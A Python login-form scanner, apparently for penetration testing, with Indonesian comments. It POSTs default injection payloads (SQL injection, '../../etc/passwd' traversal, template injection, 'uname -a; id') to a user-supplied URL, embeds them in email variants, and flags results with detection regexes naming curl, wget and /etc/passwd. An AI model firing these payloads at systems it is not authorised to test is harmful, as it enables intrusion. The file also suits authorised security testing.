import re
import requests
import logging
import math
from colorama import init, Fore, Style
import os

# Initialize colorama
init(autoreset=True)

# Setup debug logger
logging.basicConfig(
    filename="debug_scan.log",
    level=logging.DEBUG,
    format="%(asctime)s [%(levelname)s] %(message)s"
)

# Regex untuk validasi email RFC822
RFC822_REGEX = re.compile(
    r"^(?:[a-zA-Z0-9!#$%&'*+/=?^_`{|}~-]+(?:\.[a-zA-Z0-9!#$%&'*+/=?^_`{|}~-]+)*"
    r'|"(?:[\x01-\x08\x0b\x0c\x0e-\x1f\x21\x23-\x5b\x5d-\x7f]|\\[\x01-\x09\x0b\x0c\x0e-\x7f])*")'
    r"@(?:[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*)$"
)

# Regex deteksi payload berbahaya (default)
RCE_REGEX = re.compile(r"(?:\b(cat|ls|id|uname|whoami|wget|curl)\b|\;|\|\||`.+?`)", re.IGNORECASE)
LFI_REGEX = re.compile(r"(?:\.\./|\.\.\\|/etc/passwd|boot\.ini|win\.ini)", re.IGNORECASE)
SSTI_REGEX = re.compile(r"(\{\{.*?\}\}|\{\%.*?\%\})", re.IGNORECASE)

def is_rfc822_valid(email):
    return bool(RFC822_REGEX.match(email))

def highlight_match(pattern, text):
    """Highlight semua match dengan warna merah"""
    def replacer(match):
        return Fore.RED + match.group(0) + Style.RESET_ALL
    return pattern.sub(replacer, text)

def detect_and_highlight(payload, name, regex, debug=False):
    if regex.search(payload):
        highlighted = highlight_match(regex, payload)
        print(f"{name} detected in payload: {Fore.RED}YES{Style.RESET_ALL} -> {highlighted}")
        if debug:
            logging.debug(f"[{name}] match found in payload: {payload}")
        return True
    else:
        print(f"{name} detected in payload: {Fore.GREEN}NO{Style.RESET_ALL} -> {payload}")
        if debug:
            logging.debug(f"[{name}] no match in payload: {payload}")
        return False

# AI-lite heuristic scoring
def ai_risk_score(text: str) -> float:
    if not text:
        return 0.0

    specials = len(re.findall(r"[;|&{}$`<>]", text))
    length_factor = min(len(text) / 50.0, 1.0)
    entropy = 0
    freq = {ch: text.count(ch) for ch in set(text)}
    for c in freq.values():
        p = c / len(text)
        entropy -= p * math.log2(p)

    score = (specials * 0.3) + (length_factor * 0.4) + (entropy * 0.3)
    return round(min(score, 10.0), 2)

def load_payloads_from_file(filename):
    """Load payloads dari file txt"""
    try:
        with open(filename, "r") as f:
            return [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(Fore.RED + f"Error loading payload file: {e}" + Style.RESET_ALL)
        return []

def load_regex_from_file(filename):
    """Load regex pattern dari file txt"""
    regexes = []
    try:
        with open(filename, "r") as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                try:
                    regexes.append(re.compile(line, re.IGNORECASE))
                except re.error as re_err:
                    print(Fore.YELLOW + f"âš ï¸ Invalid regex skipped: {line} ({re_err})" + Style.RESET_ALL)
        return regexes
    except Exception as e:
        print(Fore.RED + f"Error loading regex file: {e}" + Style.RESET_ALL)
        return []

def save_valid_email(email, filename="valid_emails.txt"):
    """Simpan email valid ke file TXT"""
    try:
        with open(filename, "a", encoding="utf-8") as f:
            f.write(email + "\n")
        print(f"{Fore.CYAN}[+] Email valid disimpan ke {filename}{Style.RESET_ALL}")
    except Exception as e:
        print(Fore.RED + f"Error saving email {email}: {e}" + Style.RESET_ALL)

def make_email_variants(user_email, payload):
    """
    Buat varian gabungan antara email user (local@domain) dan payload.
    Varian yang dibuat:
      - payload@domain
      - payload+local@domain
      - local+payload@domain
    Jika parsing email user gagal, fallback ke payload@abcd.com untuk kompatibilitas.
    """
    try:
        local, domain = user_email.split("@", 1)
    except ValueError:
        # fallback legacy
        return [payload + "@abcd.com"]

    variants = []
    # payload as local-part
    variants.append(f"{payload}@{domain}")
    # payload as prefix + plus tag
    variants.append(f"{payload}+{local}@{domain}")
    # payload as suffix via plus tag
    variants.append(f"{local}+{payload}@{domain}")
    return variants

def scan_login(url, user_email, user_field="username", pass_field="password", output_file="scan_results.txt", debug=False, payloads=None, regexes=None):
    print(f"\nðŸ” Scanning login form at {url}\n")
    if debug:
        logging.info(f"Starting scan on {url}")

    # Default payloads jika tidak ada file
    test_payloads = payloads if payloads else [
        "admin' OR 1=1 --",
        "../../etc/passwd",
        "{{7*7}}",
        "uname -a; id"
    ]

    # Default regex jika tidak ada file
    active_regexes = regexes if regexes else [
        ("RCE", RCE_REGEX),
        ("LFI", LFI_REGEX),
        ("SSTI", SSTI_REGEX),
    ]

    valid_results = []

    for payload in test_payloads:
        print(f"\nTesting payload: {payload}")
        if debug:
            logging.debug(f"Testing payload: {payload}")

        # deteksi di sisi client
        for name, regex in active_regexes:
            detect_and_highlight(payload, name, regex, debug)

        # skor AI-lite
        risk_score = ai_risk_score(payload)
        print(f"AI Risk Score (payload): {Fore.CYAN}{risk_score}{Style.RESET_ALL}/10")
        if debug:
            logging.debug(f"AI risk score for payload '{payload}': {risk_score}")

        # gabungkan payload dengan email user yang diinput (beberapa varian)
        variants = make_email_variants(user_email, payload)
        for ve in variants:
            if is_rfc822_valid(ve):
                print(f"Email test (valid): {Fore.GREEN}{ve}{Style.RESET_ALL}")
                valid_results.append(ve)
                save_valid_email(ve)
            else:
                print(f"Email test (invalid): {Fore.YELLOW}{ve}{Style.RESET_ALL}")

        # kirim ke form login
        try:
            resp = requests.post(url, data={user_field: payload, pass_field: "test"})
            body = resp.text[:500]

            # deteksi juga di response
            for name, regex in active_regexes:
                detect_and_highlight(body, name, regex, debug)

            # skor AI-lite untuk response
            resp_score = ai_risk_score(body)
            print(f"AI Risk Score (response): {Fore.MAGENTA}{resp_score}{Style.RESET_ALL}/10")
            if debug:
                logging.debug(f"AI risk score for response (payload '{payload}'): {resp_score}")

        except Exception as e:
            print(f"{Fore.RED}Request error:{Style.RESET_ALL} {e}")
            if debug:
                logging.error(f"Request error for payload '{payload}': {e}")

    # simpan hasil valid ke file txt
    if valid_results:
        try:
            with open(output_file, "w", encoding="utf-8") as f:
                for item in valid_results:
                    f.write(item + "\n")
            print(f"\nðŸ“‚ Hasil valid disimpan ke: {Fore.CYAN}{output_file}{Style.RESET_ALL}")
            if debug:
                logging.info(f"Results written to {output_file}")
        except Exception as e:
            print(Fore.RED + f"Error writing output file {output_file}: {e}" + Style.RESET_ALL)
    else:
        print(Fore.YELLOW + "âš ï¸ Tidak ada hasil valid yang disimpan." + Style.RESET_ALL)
        if debug:
            logging.warning("No valid results to save.")

if __name__ == "__main__":
    email = input("Enter base email address (will be combined with payloads): ").strip()
    if is_rfc822_valid(email):
        print(f"RFC822 valid: {Fore.GREEN}YES{Style.RESET_ALL}")
    else:
        print(f"RFC822 valid: {Fore.RED}NO{Style.RESET_ALL} â€” fallback ke payload@abcd.com akan digunakan jika parsing gagal")

    target_url = input("Enter login form URL (ex: http://127.0.0.1/login): ").strip()

    # Pilih mode: default atau load dari file
    mode = input("Use default payloads/regex (d) or load from file (f)? [d/f]: ").strip().lower()

    payloads, regexes = None, None
    if mode == "f":
        payload_file = input("Enter payload file path (txt): ").strip()
        regex_file = input("Enter regex file path (txt): ").strip()
        if os.path.exists(payload_file):
            payloads = load_payloads_from_file(payload_file)
        if os.path.exists(regex_file):
            loaded_regexes = load_regex_from_file(regex_file)
            regexes = [(f"CustomRegex{i+1}", r) for i, r in enumerate(loaded_regexes)]

    scan_login(target_url, email, debug=True, payloads=payloads, regexes=regexes)
